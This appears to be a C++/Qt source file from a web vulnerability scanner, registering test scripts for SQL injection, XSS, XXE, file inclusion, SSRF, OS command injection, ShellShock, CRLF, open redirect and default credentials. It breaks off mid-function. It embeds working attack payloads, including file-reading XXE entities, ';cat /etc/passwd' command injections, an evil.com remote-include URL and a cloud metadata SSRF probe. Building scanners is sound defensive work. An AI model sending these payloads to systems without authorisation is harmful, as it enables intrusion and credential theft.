#include "scriptcatalog.h"
#include "testscriptbase.h"
#include "networkmanager.h"
#include "issuedb.h"
#include "issue.h"
#include "issuetemplate.h"
#include "payloadgenerator.h"

#include <QRegularExpression>
#include <QCoreApplication>
#include <QUrlQuery>
#include <QRandomGenerator>

// CMS vulnerability test registration (defined in cmsvulntests.cpp)
void registerWordPressTests(ScriptFactory &factory);
void registerJoomlaTests(ScriptFactory &factory);
void registerDrupalTests(ScriptFactory &factory);

namespace {

class NullBinder final : public ScriptFactoryDependencyBinder {
public:
    void bind(const QSharedPointer<NativeScriptInstancePort> &) const override {}
};

// SQLi Error Detection Test - Active test that sends payloads
class SqliErrorTest final : public TestScriptBase {
public:
    explicit SqliErrorTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("sqli"); }
    quint64 scriptId() const override { return 0x1001; }

    void execute() override {
        // Event type 16 = query parameter, 64 = post parameter - send payloads
        // Event type 4 = response from payload - analyze for SQLi
        const quint64 eventType = event().type;

        if (eventType == 16 || eventType == 64) {
            // New parameter detected - send SQLi payloads
            if (!parameter() || !networkContext() || !networkContext()->manager)
                return;

            const QStringList payloads = PayloadGenerator::generateSqlErrorBasedPayloads();
            const int maxPayloads = qMin(2, payloads.size()); // Limit to avoid flooding

            for (int i = 0; i < maxPayloads; ++i) {
                const QString &payload = payloads.at(i);
                QNetworkRequest request = parameter()->apply(
                    1, payload, parameter()->name(), QStringLiteral("sqli"),
                    response()->request);

                // Skip if apply returned invalid request (empty URL)
                if (request.url().isEmpty())
                    continue;

                // Mark as active test request (attr 1011 = 4 for scriptTriggerEvent4)
                request.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
                request.setAttribute(static_cast<QNetworkRequest::Attribute>(1013),
                    QStringLiteral("sqli@") + payload.left(20));

                networkContext()->manager->submit(request, "GET", QByteArray(), 4 | 1,
                    QVariant(), 0, 0);
            }
        } else if (eventType == 4) {
            // Response from SQLi payload - check for SQL errors
            if (!response())
                return;

            const QByteArray body = response()->raw.mid(response()->bodyOffset, response()->bodyLength);
            const QString content = QString::fromUtf8(body);

            static const QList<QRegularExpression> sqlErrorPatterns = {
                QRegularExpression(QStringLiteral("SQL syntax.*MySQL"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("Warning.*mysql_"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("MySqlClient\\."), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("PostgreSQL.*ERROR"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("Warning.*pg_"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("Npgsql\\."), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("Driver.* SQL[\\-\\_\\ ]*Server"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("OLE DB.* SQL Server"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("\\bSQL Server\\b.*Driver"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("Warning.*mssql_"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("System\\.Data\\.SqlClient\\.SqlException"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("ORA-[0-9]{4,5}"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("Oracle error"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("Warning.*oci_"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("Warning.*ora_"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("SQLite\\.Exception"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("System\\.Data\\.SQLite\\.SQLiteException"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("Warning.*sqlite_"), QRegularExpression::CaseInsensitiveOption),
                QRegularExpression(QStringLiteral("SQLITE_ERROR"), QRegularExpression::CaseInsensitiveOption),
            };

            for (const QRegularExpression &pattern : sqlErrorPatterns) {
                auto match = pattern.match(content);
                if (match.hasMatch()) {
                    if (issueDb()) {
                        const QString genericIssues = QCoreApplication::applicationDirPath()
                            + QStringLiteral("/assets/issues/generic-min.json");
                        Issue issue;
                        IssueTemplate::applyGeneric(&issue,
                            QStringLiteral("SQL Injection"), genericIssues);
                        issue.field30 = response()->url;
                        issue.field00 = QStringLiteral("sqli@") + response()->url.path();
                        // Include HTTP evidence
                        QByteArray reqData = response()->request.url().toEncoded();
                        QByteArray respData = response()->raw.left(4096);
                        issue.fieldF0.append({reqData, respData});
                        // Add matched error as detail
                        issue.field58 = QStringLiteral("SQL Error detected: ") + match.captured();
                        // Add parameter info
                        if (parameter()) {
                            issue.field70 = parameter()->name();
                            issue.fieldA0 = 1;
                        }
                        issueDb()->add(issue);
                    }
                    break;
                }
            }
        }
    }
};

// XSS Reflection Test - Active test that sends payloads with unique markers
class XssTest final : public TestScriptBase {
public:
    explicit XssTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("xss"); }
    quint64 scriptId() const override { return 0x1002; }

    void execute() override {
        const quint64 eventType = event().type;

        if (eventType == 16 || eventType == 64) {
            if (!parameter() || !networkContext() || !networkContext()->manager)
                return;

            // Use unique marker to verify reflection (prevents false positives)
            const QString marker = QStringLiteral("sms") + QString::number(QRandomGenerator::global()->generate() % 99999);
            const QStringList payloads = {
                QStringLiteral("<script>alert('%1')</script>").arg(marker),
                QStringLiteral("\"><img src=x onerror=alert('%1')>").arg(marker),
            };

            for (const QString &payload : payloads) {
                QNetworkRequest request = parameter()->apply(
                    1, payload, parameter()->name(), QStringLiteral("xss"),
                    response()->request);

                if (request.url().isEmpty())
                    continue;

                request.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
                // Store the marker for verification in response
                request.setAttribute(static_cast<QNetworkRequest::Attribute>(1013),
                    QStringLiteral("xss@") + marker);

                networkContext()->manager->submit(request, "GET", QByteArray(), 4 | 1,
                    QVariant(), 0, 0);
            }
        } else if (eventType == 4) {
            if (!response())
                return;

            // Get the marker we used from the request attribute
            const QString testInfo = response()->request.attribute(
                static_cast<QNetworkRequest::Attribute>(1013)).toString();
            if (!testInfo.startsWith(QStringLiteral("xss@")))
                return;

            const QString marker = testInfo.mid(4);
            const QByteArray body = response()->raw.mid(response()->bodyOffset, response()->bodyLength);
            const QString content = QString::fromUtf8(body);

            // Only report XSS if OUR specific marker is reflected (no false positives)
            if (content.contains(marker) &&
                (content.contains(QStringLiteral("<script>alert('") + marker) ||
                 content.contains(QStringLiteral("onerror=alert('") + marker))) {
                if (issueDb()) {
                    const QString genericIssues = QCoreApplication::applicationDirPath()
                        + QStringLiteral("/assets/issues/generic-min.json");
                    Issue issue;
                    IssueTemplate::applyGeneric(&issue,
                        QStringLiteral("Cross Site Scripting"), genericIssues);
                    issue.field30 = response()->url;
                    issue.field00 = QStringLiteral("xss@") + response()->url.path();
                    // Include HTTP evidence
                    QByteArray reqData = response()->request.url().toEncoded();
                    QByteArray respData = response()->raw.left(4096);
                    issue.fieldF0.append({reqData, respData});
                    // Add parameter info
                    if (parameter()) {
                        issue.field70 = parameter()->name();
                        issue.field88 = marker;
                        issue.fieldA0 = 1;
                    }
                    issueDb()->add(issue);
                }
            }
        }
    }
};

// Error Detection Test (500 errors) - Passive test
class ErrorDetectionTest final : public TestScriptBase {
public:
    explicit ErrorDetectionTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("errordetection"); }
    quint64 scriptId() const override { return 0x1003; }

    void execute() override {
        if (!response())
            return;
        if (response()->statusCode >= 500 && response()->statusCode <= 599) {
            reportIssue(QStringLiteral("Internal Server Error"),
                QStringLiteral("error@") + response()->url.path());
        }
    }
};

// XXE (XML External Entity) Test - Active test
class XxeTest final : public TestScriptBase {
public:
    explicit XxeTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("xxe"); }
    quint64 scriptId() const override { return 0x1004; }

    void execute() override {
        const quint64 eventType = event().type;
        if (eventType == 16 || eventType == 64) {
            if (!parameter() || !networkContext() || !networkContext()->manager)
                return;
            static const QStringList payloads = {
                QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
                QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"),
            };
            for (const QString &payload : payloads) {
                QNetworkRequest request = parameter()->apply(1, payload, parameter()->name(),
                    QStringLiteral("xxe"), response()->request);
                if (request.url().isEmpty()) continue;
                request.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
                networkContext()->manager->submit(request, "POST", payload.toUtf8(), 4 | 1, QVariant(), 0, 0);
            }
        } else if (eventType == 4) {
            if (!response()) return;
            const QString content = QString::fromUtf8(response()->raw.mid(response()->bodyOffset, response()->bodyLength));
            if (content.contains(QStringLiteral("root:")) || content.contains(QStringLiteral("[extensions]")))
                reportIssue(QStringLiteral("XML External Entity Injection (XXE)"), QStringLiteral("xxe@") + response()->url.path());
        }
    }
};

// RFI/LFI/SSRF/Path Traversal Test - Active test
class RfiTest final : public TestScriptBase {
public:
    explicit RfiTest(const QString &options) : TestScriptBase(options) { m_options = options; }
    QString scriptName() const override { return QStringLiteral("rfi"); }
    quint64 scriptId() const override { return 0x1005; }

    void execute() override {
        const quint64 eventType = event().type;
        if (eventType == 16 || eventType == 64) {
            if (!parameter() || !networkContext() || !networkContext()->manager) return;
            QStringList payloads;
            if (m_options.contains(QStringLiteral("lfi")) || m_options.isEmpty()) {
                payloads << QStringLiteral("../../../etc/passwd")
                         << QStringLiteral("..\\..\\..\\windows\\win.ini")
                         << QStringLiteral("....//....//....//etc/passwd");
            }
            if (m_options.contains(QStringLiteral("rfi"))) {
                payloads << QStringLiteral("http://evil.com/shell.txt")
                         << QStringLiteral("//evil.com/shell.txt");
            }
            if (m_options.contains(QStringLiteral("ssrf"))) {
                payloads << QStringLiteral("http://127.0.0.1:22")
                         << QStringLiteral("http://169.254.169.254/latest/meta-data/");
            }
            for (const QString &payload : payloads) {
                QNetworkRequest request = parameter()->apply(1, payload, parameter()->name(),
                    QStringLiteral("rfi"), response()->request);
                if (request.url().isEmpty()) continue;
                request.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
                networkContext()->manager->submit(request, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
            }
        } else if (eventType == 4) {
            if (!response()) return;
            const QString content = QString::fromUtf8(response()->raw.mid(response()->bodyOffset, response()->bodyLength));
            if (content.contains(QStringLiteral("root:x:0:")) || content.contains(QStringLiteral("[extensions]")))
                reportIssue(QStringLiteral("Local File Inclusion (LFI)"), QStringLiteral("lfi@") + response()->url.path());
        }
    }
private:
    QString m_options;
};

// OS Command Execution Test - Active test
class OsExecTest final : public TestScriptBase {
public:
    explicit OsExecTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("osexec"); }
    quint64 scriptId() const override { return 0x1006; }

    void execute() override {
        const quint64 eventType = event().type;
        if (eventType == 16 || eventType == 64) {
            if (!parameter() || !networkContext() || !networkContext()->manager) return;
            static const QStringList payloads = {
                QStringLiteral(";cat /etc/passwd"), QStringLiteral("|cat /etc/passwd"),
                QStringLiteral("`cat /etc/passwd`"), QStringLiteral("$(cat /etc/passwd)"),
                QStringLiteral(";type c:\\windows\\win.ini"), QStringLiteral("|type c:\\windows\\win.ini"),
            };
            for (const QString &payload : payloads) {
                QNetworkRequest request = parameter()->apply(1, payload, parameter()->name(),
                    QStringLiteral("osexec"), response()->request);
                if (request.url().isEmpty()) continue;
                request.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
                networkContext()->manager->submit(request, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
            }
        } else if (eventType == 4) {
            if (!response()) return;
            const QString content = QString::fromUtf8(response()->raw.mid(response()->bodyOffset, response()->bodyLength));
            if (content.contains(QStringLiteral("root:x:0:")) || content.contains(QStringLiteral("[extensions]")))
                reportIssue(QStringLiteral("OS Command Injection"), QStringLiteral("osexec@") + response()->url.path());
        }
    }
};

// ShellShock Test - Active test targeting CGI scripts
class ShellShockTest final : public TestScriptBase {
public:
    explicit ShellShockTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("shellshock"); }
    quint64 scriptId() const override { return 0x1007; }

    void execute() override {
        const quint64 eventType = event().type;
        if (eventType == 8) { // Passive - check URL for CGI
            if (!response() || !networkContext() || !networkContext()->manager) return;
            const QString path = response()->url.path();
            if (!path.contains(QStringLiteral("/cgi")) && !path.endsWith(QStringLiteral(".cgi"))
                && !path.endsWith(QStringLiteral(".sh"))) return;
            // Send ShellShock payload in User-Agent
            QNetworkRequest request(response()->url);
            request.setRawHeader("User-Agent", "() { :; }; echo; echo vulnerable");
            request.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
            networkContext()->manager->submit(request, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
        } else if (eventType == 4) {
            if (!response()) return;
            const QString content = QString::fromUtf8(response()->raw.mid(response()->bodyOffset, response()->bodyLength));
            if (content.contains(QStringLiteral("vulnerable")))
                reportIssue(QStringLiteral("ShellShock Vulnerability (CVE-2014-6271)"), QStringLiteral("shellshock@") + response()->url.path());
        }
    }
};

// Deserialization Test - Active test
class DeserializationTest final : public TestScriptBase {
public:
    explicit DeserializationTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("deserialization"); }
    quint64 scriptId() const override { return 0x1008; }

    void execute() override {
        const quint64 eventType = event().type;
        if (eventType == 16 || eventType == 64) {
            if (!parameter() || !networkContext() || !networkContext()->manager) return;
            // Java serialized object header
            static const QString javaPayload = QStringLiteral("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==");
            // PHP serialized object
            static const QString phpPayload = QStringLiteral("O:8:\"stdClass\":0:{}");
            for (const QString &payload : {javaPayload, phpPayload}) {
                QNetworkRequest request = parameter()->apply(1, payload, parameter()->name(),
                    QStringLiteral("deser"), response()->request);
                if (request.url().isEmpty()) continue;
                request.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
                networkContext()->manager->submit(request, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
            }
        } else if (eventType == 4) {
            if (!response()) return;
            const QString content = QString::fromUtf8(response()->raw.mid(response()->bodyOffset, response()->bodyLength));
            static const QRegularExpression javaError(QStringLiteral("java\\.io\\.InvalidClassException|ClassNotFoundException|java\\.io\\.ObjectStreamException"), QRegularExpression::CaseInsensitiveOption);
            static const QRegularExpression phpError(QStringLiteral("unserialize\\(\\)|__wakeup|__destruct"), QRegularExpression::CaseInsensitiveOption);
            if (javaError.match(content).hasMatch() || phpError.match(content).hasMatch())
                reportIssue(QStringLiteral("Insecure Deserialization"), QStringLiteral("deser@") + response()->url.path());
        }
    }
};

// Host Header Injection Test - Active test
class HostHeaderInjectionTest final : public TestScriptBase {
public:
    explicit HostHeaderInjectionTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("hostheaderinjection"); }
    quint64 scriptId() const override { return 0x1009; }

    void execute() override {
        if (event().type == 8) { // Passive - send request with modified host
            if (!response() || !networkContext() || !networkContext()->manager) return;
            QNetworkRequest request(response()->url);
            request.setRawHeader("Host", "evil.attacker.com");
            request.setRawHeader("X-Forwarded-Host", "evil.attacker.com");
            request.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
            networkContext()->manager->submit(request, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
        } else if (event().type == 4) {
            if (!response()) return;
            const QString content = QString::fromUtf8(response()->raw.mid(response()->bodyOffset, response()->bodyLength));
            if (content.contains(QStringLiteral("evil.attacker.com")))
                reportIssue(QStringLiteral("Host Header Injection"), QStringLiteral("hostheader@") + response()->url.path());
        }
    }
};

// IDOR Test - Active test
class IdorTest final : public TestScriptBase {
public:
    explicit IdorTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("idor"); }
    quint64 scriptId() const override { return 0x100A; }

    void execute() override {
        const quint64 eventType = event().type;
        if (eventType == 16 || eventType == 64) {
            if (!parameter() || !networkContext() || !networkContext()->manager) return;
            // Common IDOR test values
            static const QStringList payloads = {
                QStringLiteral("1"), QStringLiteral("2"), QStringLiteral("0"),
                QStringLiteral("admin"), QStringLiteral("../1"), QStringLiteral("1'"),
            };
            for (const QString &payload : payloads) {
                QNetworkRequest request = parameter()->apply(1, payload, parameter()->name(),
                    QStringLiteral("idor"), response()->request);
                if (request.url().isEmpty()) continue;
                request.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
                networkContext()->manager->submit(request, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
            }
        }
        // Note: IDOR detection requires response comparison which is complex
    }
};

// Passive test base - for tests that only analyze responses
class PassiveTestBase : public TestScriptBase {
public:
    explicit PassiveTestBase(const QString &options) : TestScriptBase(options) {}
protected:
    void reportIssue(const QString &name, const QString &id, const QString &details = {}) {
        if (issueDb() && response()) {
            const QString genericIssues = QCoreApplication::applicationDirPath()
                + QStringLiteral("/assets/issues/generic-min.json");
            Issue issue;
            IssueTemplate::applyGeneric(&issue, name, genericIssues);
            issue.field30 = response()->url;
            issue.field00 = id;
            // Include HTTP evidence
            QByteArray reqData = response()->request.url().toEncoded();
            QByteArray respData = response()->raw.left(4096);
            issue.fieldF0.append({reqData, respData});
            if (!details.isEmpty())
                issue.field58 = details;
            issueDb()->add(issue);
        }
    }
};

// HTTP Headers Test - Passive test
class HttpHeadersTest final : public PassiveTestBase {
public:
    explicit HttpHeadersTest(const QString &options) : PassiveTestBase(options) {}
    QString scriptName() const override { return QStringLiteral("httpheaders"); }
    quint64 scriptId() const override { return 0x100B; }
    void execute() override {
        if (event().type != 8 || !response()) return;
    }
};

// Backup File Detection Test - checks for common backup file extensions
class BackupTest final : public TestScriptBase {
public:
    explicit BackupTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("backup"); }
    quint64 scriptId() const override { return 0x100C; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        static const QStringList exts = {".bak", ".backup", ".old", ".orig", ".save", ".swp", "~", ".tmp"};
        const QString path = response()->url.path();
        if (path.isEmpty() || path == QStringLiteral("/")) return;
        for (const QString &ext : exts) {
            QUrl url = response()->url;
            url.setPath(path + ext);
            QNetworkRequest req(url);
            req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
            req.setAttribute(static_cast<QNetworkRequest::Attribute>(1013), QStringLiteral("backup"));
            networkContext()->manager->submit(req, "HEAD", QByteArray(), 4 | 1, QVariant(), 0, 0);
        }
    }
};

// Hidden File Detection Test - checks for hidden/sensitive files
class HiddenTest final : public TestScriptBase {
public:
    explicit HiddenTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("hidden"); }
    quint64 scriptId() const override { return 0x100D; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        static QSet<QString> tested;
        const QString host = response()->url.host();
        if (tested.contains(host)) return;
        tested.insert(host);
        static const QStringList paths = {".git/config", ".svn/entries", ".env", ".htaccess", ".htpasswd",
            "wp-config.php.bak", "config.php.bak", ".DS_Store", "Thumbs.db", "web.config"};
        for (const QString &p : paths) {
            QUrl url = response()->url;
            url.setPath(QStringLiteral("/") + p);
            QNetworkRequest req(url);
            req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
            req.setAttribute(static_cast<QNetworkRequest::Attribute>(1013), QStringLiteral("hidden"));
            networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
        }
    }
};

// Sitemap Test - checks sitemap.xml for information disclosure
class SitemapTest final : public TestScriptBase {
public:
    explicit SitemapTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("sitemap"); }
    quint64 scriptId() const override { return 0x100E; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        static QSet<QString> tested;
        const QString host = response()->url.host();
        if (tested.contains(host)) return;
        tested.insert(host);
        QUrl url = response()->url;
        url.setPath(QStringLiteral("/sitemap.xml"));
        QNetworkRequest req(url);
        req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
        req.setAttribute(static_cast<QNetworkRequest::Attribute>(1013), QStringLiteral("sitemap"));
        networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
    }
};

// Robots.txt Test - already handled in PassiveChecks but register for config compatibility
class RobotstxtTest final : public TestScriptBase {
public:
    explicit RobotstxtTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("robotstxt"); }
    quint64 scriptId() const override { return 0x100F; }
    void execute() override { }
};

// Fingerprint Test - passive detection already in PassiveChecks
class FingerprintTest final : public TestScriptBase {
public:
    explicit FingerprintTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("fingerprint"); }
    quint64 scriptId() const override { return 0x1010; }
    void execute() override { }
};

// Secret Leak Test - passive detection already in PassiveChecks
class SecretLeakTest final : public TestScriptBase {
public:
    explicit SecretLeakTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("secretleak"); }
    quint64 scriptId() const override { return 0x1011; }
    void execute() override { }
};

// Parser Test - crawler functionality
class ParserTest final : public TestScriptBase {
public:
    explicit ParserTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("parser"); }
    quint64 scriptId() const override { return 0x1012; }
    void execute() override { }
};

// Passive Test - generic passive checks wrapper
class PassiveTest final : public TestScriptBase {
public:
    explicit PassiveTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("passive"); }
    quint64 scriptId() const override { return 0x1013; }
    void execute() override { }
};

// Fuzzer Test - fuzz testing parameters
class FuzzerTest final : public TestScriptBase {
public:
    explicit FuzzerTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("fuzzer"); }
    quint64 scriptId() const override { return 0x1014; }
    void execute() override {
        if (event().type != 16 && event().type != 64) return;
        if (!parameter() || !networkContext()) return;
        static const QStringList payloads = {
            QString(1000, QLatin1Char('A')), // Buffer overflow
            QStringLiteral("%n%n%n%n%n"), // Format string
            QStringLiteral("{{7*7}}"), // Template injection
            QStringLiteral("${7*7}"), // Expression injection
        };
        for (const QString &payload : payloads) {
            QNetworkRequest req = parameter()->apply(1, payload, parameter()->name(),
                QStringLiteral("fuzzer"), response()->request);
            if (req.url().isEmpty()) continue;
            req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
            networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
        }
    }
};

// Expression Language Injection Test (ELI)
class EliTest final : public TestScriptBase {
public:
    explicit EliTest(const QString &options) : TestScriptBase(options) {}
    QString scriptName() const override { return QStringLiteral("eli"); }
    quint64 scriptId() const override { return 0x1015; }
    void execute() override {
        if (event().type != 16 && event().type != 64) return;
        if (!parameter() || !networkContext()) return;
        static const QStringList payloads = {
            QStringLiteral("${7*7}"), QStringLiteral("#{7*7}"),
            QStringLiteral("%{7*7}"), QStringLiteral("{{7*7}}"),
            QStringLiteral("${{7*7}}"), QStringLiteral("*{7*7}"),
        };
        for (const QString &payload : payloads) {
            QNetworkRequest req = parameter()->apply(1, payload, parameter()->name(),
                QStringLiteral("eli"), response()->request);
            if (req.url().isEmpty()) continue;
            req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
            networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
        }
    }
};

// XSS in HTTP Header Test
class XssInHttpTest final : public TestScriptBase {
public:
    explicit XssInHttpTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("xssinhttp"); }
    quint64 scriptId() const override { return 0x1016; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        static QSet<QString> tested;
        if (tested.contains(response()->url.host())) return;
        tested.insert(response()->url.host());
        QNetworkRequest req(response()->url);
        req.setRawHeader("X-Custom-Header", "<script>alert(1)</script>");
        req.setRawHeader("Referer", "<script>alert(1)</script>");
        req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
        networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
    }
};

// XSS in URI Test
class XssInUriTest final : public TestScriptBase {
public:
    explicit XssInUriTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("xssinuri"); }
    quint64 scriptId() const override { return 0x1017; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        QUrl url = response()->url;
        url.setPath(url.path() + QStringLiteral("/<script>alert(1)</script>"));
        QNetworkRequest req(url);
        req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
        networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
    }
};

// Vulnerable JS Library Test
class VulnerableJsLibTest final : public TestScriptBase {
public:
    explicit VulnerableJsLibTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("vulnerablejslib"); }
    quint64 scriptId() const override { return 0x1018; }
    void execute() override {
        if (event().type != 8 || !response()) return;
        const QString content = QString::fromUtf8(response()->raw.mid(response()->bodyOffset, response()->bodyLength));
        static const QRegularExpression jqueryRe(QStringLiteral("jquery[/-]?(\\d+\\.\\d+\\.\\d+)"), QRegularExpression::CaseInsensitiveOption);
        static const QRegularExpression angularRe(QStringLiteral("angular[/-]?(\\d+\\.\\d+\\.\\d+)"), QRegularExpression::CaseInsensitiveOption);
        auto match = jqueryRe.match(content);
        if (match.hasMatch()) {
            QString ver = match.captured(1);
            if (ver.startsWith(QStringLiteral("1.")) || ver.startsWith(QStringLiteral("2.")))
                reportIssue(QStringLiteral("Vulnerable JavaScript Library (jQuery)"), QStringLiteral("jslib@jquery-") + ver);
        }
    }
};

// Unicode Test
class UnicodeTest final : public TestScriptBase {
public:
    explicit UnicodeTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("unicode"); }
    quint64 scriptId() const override { return 0x1019; }
    void execute() override {
        if (event().type != 16 && event().type != 64) return;
        if (!parameter() || !networkContext()) return;
        static const QStringList payloads = {
            QStringLiteral("%c0%ae%c0%ae/etc/passwd"), // Unicode encoding bypass
            QStringLiteral("..%c0%af..%c0%af"), // IIS Unicode
            QStringLiteral("%u002e%u002e%u002f"), // UTF-16 encoding
        };
        for (const QString &p : payloads) {
            QNetworkRequest req = parameter()->apply(1, p, parameter()->name(), scriptName(), response()->request);
            if (req.url().isEmpty()) continue;
            req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
            networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
        }
    }
};

// CRLF Injection Test
class CrlfTest final : public TestScriptBase {
public:
    explicit CrlfTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("crlfinurl"); }
    quint64 scriptId() const override { return 0x101A; }
    void execute() override {
        if (event().type != 16 && event().type != 64) return;
        if (!parameter() || !networkContext()) return;
        static const QStringList payloads = {
            QStringLiteral("%0d%0aSet-Cookie:crlf=injected"),
            QStringLiteral("%0d%0aX-Injected:true"),
            QStringLiteral("\r\nSet-Cookie:crlf=true"),
        };
        for (const QString &p : payloads) {
            QNetworkRequest req = parameter()->apply(1, p, parameter()->name(), scriptName(), response()->request);
            if (req.url().isEmpty()) continue;
            req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
            networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
        }
    }
};

// Redirect Test
class RedirectTest final : public TestScriptBase {
public:
    explicit RedirectTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("redirection"); }
    quint64 scriptId() const override { return 0x101B; }
    void execute() override {
        if (event().type != 16 && event().type != 64) return;
        if (!parameter() || !networkContext()) return;
        static const QStringList payloads = {
            QStringLiteral("//evil.com"), QStringLiteral("https://evil.com"),
            QStringLiteral("/\\evil.com"), QStringLiteral("////evil.com"),
        };
        for (const QString &p : payloads) {
            QNetworkRequest req = parameter()->apply(1, p, parameter()->name(), scriptName(), response()->request);
            if (req.url().isEmpty()) continue;
            req.setAttribute(static_cast<QNetworkRequest::Attribute>(1011), 4 | 1);
            networkContext()->manager->submit(req, "GET", QByteArray(), 4 | 1, QVariant(), 0, 0);
        }
    }
};

// Redirect in URL Test
class RedirectInUrlTest final : public TestScriptBase {
public:
    explicit RedirectInUrlTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("redirectioninurl"); }
    quint64 scriptId() const override { return 0x101C; }
    void execute() override { }
};

// Basic Auth Test
class BasicAuthTest final : public TestScriptBase {
public:
    explicit BasicAuthTest(const QString &o) : TestScriptBase(o) {}
    QString scriptName() const override { return QStringLiteral("basicauthtest"); }
    quint64 scriptId() const override { return 0x101D; }
    void execute() override {
        if (event().type != 8 || !response() || !networkContext()) return;
        if (response()->statusCode != 401) return;
        static const QStringList creds = {"admin:admin", "admin:password", "root:root", "test:test"};
        for (const QString &c : creds) {
